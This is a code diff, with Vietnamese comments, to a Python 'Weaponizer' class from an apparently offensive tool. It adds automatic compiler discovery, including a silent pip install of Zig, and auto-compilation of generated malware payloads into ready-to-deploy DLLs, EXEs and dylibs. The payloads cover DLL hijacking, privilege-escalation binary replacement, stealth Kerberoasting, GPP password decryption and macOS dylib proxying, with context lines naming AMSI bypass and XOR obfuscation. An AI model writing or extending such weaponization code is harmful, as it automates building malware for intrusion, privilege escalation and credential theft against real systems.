@@ -1,4 +1,7 @@
 import os
+import subprocess
+import shutil
+import sys
 from colorama import Fore, Style
 
 class Weaponizer:
@@ -9,6 +12,156 @@ class Weaponizer:
         
         if not os.path.exists(self.output_dir):
             os.makedirs(self.output_dir)
+        
+        self._compiler = None
+        self._compiler_type = None
+
+    def _find_compiler(self):
+        """Tìm C compiler trên hệ thống: gcc > zig cc > auto-install zig"""
+        if self._compiler:
+            return self._compiler
+
+        # 1. Tìm GCC / MinGW trên PATH
+        gcc_names = ["gcc", "x86_64-w64-mingw32-gcc", "i686-w64-mingw32-gcc"]
+        for name in gcc_names:
+            path = shutil.which(name)
+            if path:
+                self._compiler = path
+                self._compiler_type = "gcc"
+                return path
+
+        # 2. Tìm GCC ở các đường dẫn phổ biến trên Windows
+        common_paths = [
+            r"C:\msys64\mingw64\bin\gcc.exe",
+            r"C:\mingw64\bin\gcc.exe",
+            r"C:\TDM-GCC-64\bin\gcc.exe",
+            r"C:\MinGW\bin\gcc.exe",
+        ]
+        for p in common_paths:
+            if os.path.isfile(p):
+                self._compiler = p
+                self._compiler_type = "gcc"
+                return p
+
+        # 3. Tìm Zig (zig cc hoạt động như drop-in GCC)
+        zig_path = shutil.which("zig")
+        if not zig_path:
+            # Tìm zig.exe trong site-packages/ziglang/ (pip install ziglang)
+            try:
+                import ziglang
+                candidate = os.path.join(os.path.dirname(ziglang.__file__), "zig.exe")
+                if os.path.isfile(candidate):
+                    zig_path = candidate
+            except ImportError:
+                pass
+        if zig_path:
+            self._compiler = zig_path
+            self._compiler_type = "zig"
+            return zig_path
+
+        # 4. Auto-install ziglang qua pip (portable, không cần Admin)
+        print(f"  {Fore.YELLOW}[*] Không tìm thấy GCC/MinGW. Đang cài Zig compiler qua pip...{Style.RESET_ALL}")
+        try:
+            subprocess.check_call(
+                [sys.executable, "-m", "pip", "install", "ziglang"],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            # Sau khi cài, tìm zig.exe trong package vừa cài
+            try:
+                import importlib
+                import ziglang
+                importlib.reload(ziglang)
+                candidate = os.path.join(os.path.dirname(ziglang.__file__), "zig.exe")
+                if os.path.isfile(candidate):
+                    zig_path = candidate
+            except ImportError:
+                zig_path = shutil.which("zig")
+            
+            if zig_path:
+                self._compiler = zig_path
+                self._compiler_type = "zig"
+                print(f"  {Fore.GREEN}[+] Đã cài Zig compiler thành công!{Style.RESET_ALL}")
+                return zig_path
+        except Exception:
+            pass
+
+        print(f"  {Fore.RED}[!] Không thể tìm/cài C compiler. File .c sẽ không được compile tự động.{Style.RESET_ALL}")
+        print(f"  {Fore.YELLOW}    Cài thủ công: pip install ziglang  HOẶC  tải MinGW-w64{Style.RESET_ALL}")
+        return None
+
+    def _compile_dll(self, c_path, dll_output_name, def_path=None):
+        """Compile file .c thành .dll và đặt vào output_dir"""
+        compiler = self._find_compiler()
+        if not compiler:
+            return None
+
+        dll_path = os.path.join(self.output_dir, dll_output_name)
+        print(f"  {Fore.CYAN}[*] Đang compile {dll_output_name} bằng {self._compiler_type}...{Style.RESET_ALL}")
+
+        try:
+            if self._compiler_type == "gcc":
+                cmd = [compiler, "-shared", "-o", dll_path, c_path]
+                if def_path and os.path.isfile(def_path):
+                    cmd.append(def_path)
+                cmd.extend(["-lws2_32", "-lwinmm"])
+            elif self._compiler_type == "zig":
+                cmd = [compiler, "cc", "-shared", "-o", dll_path, c_path]
+                if def_path and os.path.isfile(def_path):
+                    cmd.append(def_path)
+                cmd.extend(["-lws2_32", "-lwinmm"])
+            else:
+                return None
+
+            result = subprocess.run(
+                cmd, capture_output=True, text=True, timeout=300
+            )
+
+            if result.returncode == 0 and os.path.isfile(dll_path):
+                size_kb = os.path.getsize(dll_path) / 1024
+                print(f"  {Fore.RED}[COMPILED] {dll_path} ({size_kb:.1f} KB) - SẴN SÀNG TRIỂN KHAI!{Style.RESET_ALL}")
+                return dll_path
+            else:
+                err = result.stderr.strip()[:200] if result.stderr else "Unknown error"
+                print(f"  {Fore.YELLOW}[!] Compile thất bại: {err}{Style.RESET_ALL}")
+                return None
+
+        except subprocess.TimeoutExpired:
+            print(f"  {Fore.YELLOW}[!] Compile timeout (>300s){Style.RESET_ALL}")
+            return None
+        except Exception as e:
+            print(f"  {Fore.YELLOW}[!] Compile error: {e}{Style.RESET_ALL}")
+            return None
+
+    def _compile_exe(self, c_path, exe_output_name):
+        """Compile file .c thành .exe"""
+        compiler = self._find_compiler()
+        if not compiler:
+            return None
+
+        exe_path = os.path.join(self.output_dir, exe_output_name)
+
+        try:
+            if self._compiler_type == "gcc":
+                cmd = [compiler, "-o", exe_path, c_path, "-lws2_32"]
+            elif self._compiler_type == "zig":
+                cmd = [compiler, "cc", "-o", exe_path, c_path, "-lws2_32"]
+            else:
+                return None
+
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+
+            if result.returncode == 0 and os.path.isfile(exe_path):
+                size_kb = os.path.getsize(exe_path) / 1024
+                print(f"  {Fore.RED}[COMPILED] {exe_path} ({size_kb:.1f} KB) - SẴN SÀNG TRIỂN KHAI!{Style.RESET_ALL}")
+                return exe_path
+            else:
+                err = result.stderr.strip()[:200] if result.stderr else "Unknown error"
+                print(f"  {Fore.YELLOW}[!] Compile thất bại: {err}{Style.RESET_ALL}")
+                return None
+
+        except Exception as e:
+            print(f"  {Fore.YELLOW}[!] Compile error: {e}{Style.RESET_ALL}")
+            return None
 
     def run(self, verified_results=None):
         print(f"\n{Fore.RED}[!] KÍCH HOẠT AUTO-WEAPONIZATION (TỰ ĐỘNG SINH MÃ ĐỘC) {Style.RESET_ALL}")
@@ -65,7 +218,7 @@ class Weaponizer:
             print(f" {Fore.GREEN}[-] Không tìm thấy điểm chốt để sinh Payload Tự động đối với file này.{Style.RESET_ALL}")
         else:
             print(f" {Fore.RED}\n[!!] Đã sinh {payloads_generated} File Mã độc/Exploit vào thư mục '{self.output_dir}'!{Style.RESET_ALL}")
-            print(f" {Fore.RED}[!!] Bạn chỉ cần Compile và quăng chung thư mục với {os.path.basename(self.target_name)} để Hack ngược.{Style.RESET_ALL}")
+            print(f" {Fore.RED}[!!] Quăng file DLL đã compile chung thư mục với {os.path.basename(self.target_name)} để Hack ngược.{Style.RESET_ALL}")
 
     def _xor_string(self, data, key=0x37):
         """Helper để mã hóa XOR chuỗi cho C payload"""
@@ -153,6 +306,9 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
         with open(c_path, "w", encoding="utf-8") as f: f.write(payload_code)
         
         print(f"  {Fore.MAGENTA}[GHOST] ĐÃ TÀNG HÌNH HÓA PAYLOAD: {c_path} (AMSI Bypass + XOR Integrated){Style.RESET_ALL}")
+        
+        # Auto-compile thành DLL
+        self._compile_dll(c_path, dll_name, def_path)
 
 
     def _generate_dll_hijack_payload(self, dll_name):
@@ -177,6 +333,9 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
         file_path = os.path.join(self.output_dir, f"exploit_for_{dll_name}.c")
         with open(file_path, "w", encoding="utf-8") as f: f.write(payload_c_code)
         print(f"  {Fore.MAGENTA}[GHOST] Đã đẻ file Payload Tàng hình: {file_path}{Style.RESET_ALL}")
+        
+        # Auto-compile thành DLL
+        self._compile_dll(file_path, dll_name)
 
     def _generate_binary_replacement_payload(self):
         filename = os.path.basename(self.target_name)
@@ -205,6 +364,9 @@ int main() {{
         with open(file_path, "w", encoding="utf-8") as f:
             f.write(payload_code)
         print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ LEO THANG (LPE): {file_path}{Style.RESET_ALL}")
+        
+        # Auto-compile thành EXE
+        self._compile_exe(file_path, f"lpe_{filename}")
 
     def _generate_kerberoast_payload(self, v):
         payload_code = f"""#include <windows.h>
@@ -232,6 +394,9 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul, LPVOID lp) {{
         file_path = os.path.join(self.output_dir, "ad_kerberoast_stealth.c")
         with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
         print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ AD (Stealth Kerberoast): {file_path}{Style.RESET_ALL}")
+        
+        # Auto-compile thành DLL
+        self._compile_dll(file_path, "ad_kerberoast_stealth.dll")
 
     def _generate_gpp_decrypter_payload(self):
         payload_code = """#include <windows.h>
@@ -260,6 +425,9 @@ int main() {
         file_path = os.path.join(self.output_dir, "ad_gpp_decrypter.c")
         with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
         print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ AD (GPP Decrypter): {file_path}{Style.RESET_ALL}")
+        
+        # Auto-compile thành EXE
+        self._compile_exe(file_path, "ad_gpp_decrypter.exe")
 
     def _generate_macos_dylib_payload(self):
         payload_code = """#include <stdio.h>
@@ -279,6 +447,9 @@ static void MacPwn() {
         file_path = os.path.join(self.output_dir, "macos_exploit_proxy.c")
         with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
         print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ macOS (dylib Proxy): {file_path}{Style.RESET_ALL}")
+        
+        # Auto-compile thành dylib
+        self._compile_dll(file_path, "macos_exploit_proxy.dylib")
 
     def _generate_launchagent_payload(self):
         payload_code = """<?xml version="1.0" encoding="UTF-8"?>
